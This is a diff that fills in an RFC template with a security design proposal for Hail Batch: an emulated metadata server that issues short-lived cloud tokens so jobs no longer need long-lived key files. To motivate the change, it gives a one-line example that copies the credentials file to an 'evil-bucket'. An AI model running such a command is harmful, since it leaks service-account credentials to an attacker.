@@ -16,87 +16,189 @@ Keyless Cloud Authentication in Hail Batch Jobs
 .. contents::
 .. role::
 
+In a Hail Batch pipeline, all user code runs under one of two identities associated
+with the underlying cloud platform. On the user's computer, code runs as the user's
+human identity. Inside a Batch job running in the cloud, the job is running as a
+Hail-managed identity created for that user on signup. We will refer to this
+identities as the user's Human Identity and the Robot Identity, respectively.
+
+In the current system, Batch jobs are given access to the users' robot identity
+through a file planted in the job's filesystem containing the identity's
+credentials. In GCP, the credentials are a GSA key file. In Azure, the credentials
+are a username/password for a AAD Service Principal. These credentials are created,
+stored, and rotated by the Hail Batch system. 
+
+
 Motivation
 ----------
-Give a strong reason for why the community needs this change. Describe the use
-case as clearly as possible and give an example. Explain how the status quo is
-insufficient or not ideal.
 
-A good Motivation section is often driven by examples and real-world scenarios.
+Exposing long-lived credentials to user jobs poses a security risk,
+as these credentials could be easily exfiltrated by the user or any malicious
+code the user inadvertantly runs. The following is all that needs to run to
+exfiltrate these credentials.
+
+.. code-block:: python
+   j.command('gcloud storage cp $GOOGLE_APPLICATION_CREDENTIALS gs://evil-bucket/')
+
+Hail operators rotate GSA keys quarterly, so such an exfiltration could provide
+a malicious actor access to all resources granted to the robot identity for up
+to 90 days.
+
+Cloud providers avoid persisting long-lived credentials on user machines through
+the Metadata Server interface, an HTTP endpoint available on a
+`link-local https://en.wikipedia.org/wiki/Link-local_address`_ address which can
+issue access tokens for the identity assigned to the virtual machine. Available
+metadata in GCP is described [here](https://cloud.google.com/compute/docs/metadata/predefined-metadata-keys). This interface has the following advantages:
+
+- Unlike long-lived keys, these tokens are short-lived (e.g. 1 hour), reducing
+  the potential attack window following exfiltration.
+- The metadata server can be configured only to issue certain scopes, so the
+  operations a job can perform may be restricted. It is not possible to scope
+  GSA keys and AAD SP client secrets.
+
+This proposal seeks to provide an emulated metadata server to Batch jobs and remove
+jobs' dependence on long-lived credentials.
+
+Removing this dependency also opens the door to future work of removing
+long-lived credentials entirely from the system in favor of alternative approaches
+to gaining access tokens from the cloud identity providers (discussed briefly 
+in Inspiration & Alternatives).
+
 
 Proposed Change Specification
 -----------------------------
-Specify the change in precise, comprehensive yet concise language. Avoid words
-like "should" or "could". Strive for a complete definition. Your specification
-may include,
 
-* the types and semantics of any new library interfaces
-* how the proposed change interacts with existing language or compiler
-  features, in case that is otherwise ambiguous
+Batch jobs access credentials on the filesystem through the
+``$GOOGLE_APPLICATION_CREDENTIALS``/``$AZURE_APPLICATION_CREDENTIALS``
+environment variables (EVs). Under this change, the files and EVs will still be
+available but their use will be deprecated in the documentation.
 
-Strive for *precision*. Note, however, that this section should focus on a
-precise *specification*; it need not (and should not) devote space to
-*implementation* details -- the "Implementation Plan" section can be used for
-that.
+Currently, Batch uses firewall rules to block access to the metadata server for
+user jobs, permitting users access would allow them to impersonate the batch worker.
+This proposal would allow packets from jobs destined to ``169.254.169.254`` but
+redirect those packets to a web server owned by the Batch Worker.
+The Batch Worker can then use the
+credentials for the job in question to generate access tokens on behalf of the
+robot identity and distribute them upon request.
 
-The specification can, and almost always should, be illustrated with
-*examples* that illustrate corner cases. But it is not sufficient to
-give a couple of examples and regard that as the specification! The
-examples should illustrate and elucidate a clearly-articulated
-specification that covers the general case.
+The following sequence diagrams illustrate how a Batch job obtains credentials
+to access a cloud resource in the current system and under the proposed change.
+The diagrams use GCP-specific terms and URLs, but the interaction is largely
+the same in Azure.
+
+
+Current System
+==============
+
++-----+                                                +-----+              +-----+
+| Job |                                                | IAM |              | GCS |
++-----+                                                +-----+              +-----+
+   | --------------------------------------------------\  |                    |
+   |-| Cook up request for access token using key file |  |                    |
+   | |-------------------------------------------------|  |                    |
+   |                                                      |                    |
+   | https://www.googleapis.com/oauth2/v4/token           |                    |
+   |----------------------------------------------------->|                    |
+   |                                                      | ----------------\  |
+   |                                                      |-| Validate key  |  |
+   |                                                      | |---------------|  |
+   |                                                      |                    |
+   |                          Access Token scoped for GCS |                    |
+   |<-----------------------------------------------------|                    |
+   |                                                      |                    |
+   | Access Token                                         |                    |
+   |-------------------------------------------------------------------------->|
+   |                                                      |                    | -----------------------------------\
+   |                                                      |                    |-| Validate access token and scopes |
+   |                                                      |                    | |----------------------------------|
+   |                                                      |                    |
+   |                                                      |               File |
+   |<--------------------------------------------------------------------------|
+   |                                                      |                    |
+
+
+Proposed Model
+==============
+
++-----+                                                                                +---------+                                              +-----+              +-----+
+| Job |                                                                                | Worker  |                                              | IAM |              | GCS |
++-----+                                                                                +---------+                                              +-----+              +-----+
+   |                                                                                        |                                                      |                    |
+   | http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token      |                                                      |                    |
+   |--------------------------------------------------------------------------------------->|                                                      |                    |
+   |                                                                                        | --------------------------------------------------\  |                    |
+   |                                                                                        |-| Cook up request for access token using key file |  |                    |
+   |                                                                                        | |-------------------------------------------------|  |                    |
+   |                                                                                        |                                                      |                    |
+   |                                                                                        | https://www.googleapis.com/oauth2/v4/token           |                    |
+   |                                                                                        |----------------------------------------------------->|                    |
+   |                                                                                        |                                                      | ----------------\  |
+   |                                                                                        |                                                      |-| Validate key  |  |
+   |                                                                                        |                                                      | |---------------|  |
+   |                                                                                        |                                                      |                    |
+   |                                                                                        |                          Access Token scoped for GCS |                    |
+   |                                                                                        |<-----------------------------------------------------|                    |
+   |                                                                                        |                                                      |                    |
+   |                                                                           Access Token |                                                      |                    |
+   |<---------------------------------------------------------------------------------------|                                                      |                    |
+   |                                                                                        |                                                      |                    |
+   | Access Token                                                                           |                                                      |                    |
+   |------------------------------------------------------------------------------------------------------------------------------------------------------------------->|
+   |                                                                                        |                                                      |                    | -----------------------------------\
+   |                                                                                        |                                                      |                    |-| Validate access token and scopes |
+   |                                                                                        |                                                      |                    | |----------------------------------|
+   |                                                                                        |                                                      |                    |
+   |                                                                                        |                                                      |               File |
+   |<-------------------------------------------------------------------------------------------------------------------------------------------------------------------|
+   |                                                                                        |                                                      |                                      |
+
+
+It is worth emphasizing that the purpose of this feature is *not* to provide a
+fully complete and compliant metadata server to Hail Batch. Rather, the aim is to provide the
+minimum functionality necessary to allow Hail libraries and popular first-party
+tools like `gcloud` and `az` the ability to obtain short-lived credentials without
+exposing key files to user code. As such, an implementation may implement just the
+endpoints necessary to run the below examples for at least one version of `gcloud`/`az`
+and all supported versions of `hail`.
+
 
 Examples
 --------
-This section illustrates the specification through the use of examples of the
-language change proposed. It is best to exemplify each point made in the
-specification, though perhaps one example can cover several points. Contrived
-examples are OK here. If the Motivation section describes something that is
-hard to do without this proposal, this is a good place to show how easy that
-thing is to do with the proposal.
+
+Under the proposed change, the following Batch job commands should succeed:
+
+.. code-block:: python
+   j.command('gcloud storage ls <MY_BUCKET>')
+   j.command('hailctl batch submit <MY_SCRIPT>')
+
 
 Effect and Interactions
 -----------------------
-Your proposed change addresses the issues raised in the motivation. Explain how.
 
-Also, discuss possibly contentious interactions with existing language or compiler
-features. Complete this section with potential interactions raised
-during the PR discussion.
+This change adds a method through which jobs can obtained short-lived access
+tokens without directly accessing long-lived credentials. With such a solution
+in place, we can eventually remove the long-lived credentials from job containers,
+mitigating the risk of exfiltration.
 
-Costs and Drawbacks
--------------------
-Give an estimate on development and maintenance costs. List how this affects
-learnability of the language for novice users. Define and list any remaining
-drawbacks that cannot be resolved.
+So long as the firewall rules are correctly configured to redirect metadata traffic
+to the Batch worker, there should be no adverse interactions with the existing
+system as such traffic was previously forbidden.
 
-Alternatives
-------------
-List alternative designs to your proposed change. Both existing
-workarounds, or alternative choices for the changes. Explain
-the reasons for choosing the proposed change over these alternative:
-*e.g.* they can be cheaper but insufficient, or better but too
-expensive. Or something else.
 
-The PR discussion often raises other potential designs, and they should be
-added to this section. Similarly, if the proposed change
-specification changes significantly, the old one should be listed in
-this section.
+Inspiration & Alternatives
+--------------------------
 
-Unresolved Questions
---------------------
-Explicitly list any remaining issues that remain in the conceptual design and
-specification. Be upfront and trust that the community will help. Please do
-not list *implementation* issues.
+We can look to the Kubernetes project for examples of integrating with cloud
+identity providers. In particular, we will examine [GKE's Workload Identity](https://cloud.google.com/kubernetes-engine/docs/concepts/workload-identity#what_is).
+Workload identity allows pods to obtain credentials for GCP IAM identities. To
+do so, GKE runs the [GKE Metadata Server](https://cloud.google.com/kubernetes-engine/docs/concepts/workload-identity#metadata_server)
+which functions similarly to what is described in this proposal.
 
-Implementation Plan
--------------------
-(Optional) If accepted who will implement the change? Which other resources
-and prerequisites are required for implementation?
-
-Endorsements
--------------
-(Optional) This section provides an opportunity for any third parties to express their
-support for the proposal, and to say why they would like to see it adopted.
-It is not mandatory for have any endorsements at all, but the more substantial
-the proposal is, the more desirable it is to offer evidence that there is
-significant demand from the community.  This section is one way to provide
-such evidence.
+The difference arises in how the metadata server fulfills the user's request for
+an access token. Unlike in this proposal, GKE nodes do not hold IAM credentials.
+Instead, it uses OIDC to "trade" a Kubernetes Service Account credential for a
+[preconfigured IAM credential](https://cloud.google.com/kubernetes-engine/docs/concepts/workload-identity#credential-flow). This has the advantage of not needing to distribute IAM
+credentials in GKE and enabling fine-grained mapping between GKE and IAM identities.
+However, OIDC is not easily applicable in Hail Batch because Batch is not an
+identity provider. We could remove the storage and distribution of key files in GCP by
+using [IAM Service Account Impersonation](https://cloud.google.com/docs/authentication/use-service-account-impersonation), but that is outside the scope of this RFC.
